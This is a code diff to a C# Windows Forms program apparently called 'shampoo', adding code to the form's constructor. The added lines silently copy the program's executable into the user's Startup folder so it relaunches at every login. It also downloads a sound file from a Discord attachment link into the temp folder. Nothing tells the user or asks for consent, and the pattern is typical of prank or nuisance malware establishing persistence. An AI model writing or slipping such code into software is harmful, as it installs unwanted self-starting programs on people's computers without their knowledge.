@@ -16,6 +16,17 @@ namespace shampoo
 
         public Form1()
         {
+            string source = AppDomain.CurrentDomain.BaseDirectory + "\\shampoo.exe";
+            string dest = "C:\\Users\\" + Environment.UserName + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\shampoo.exe";
+            if (File.Exists(dest))
+            {
+
+            }
+            else
+            {
+                File.Copy(source, dest, true);
+            }
+
             WebClient webClient = new WebClient();
             Uri shampoos = new Uri("https://cdn.discordapp.com/attachments/966780583600619594/967199545928859699/shampoo.wav", UriKind.Absolute);
             webClient.DownloadFile(shampoos, Path.GetTempPath() + "\\shampoo.wav");
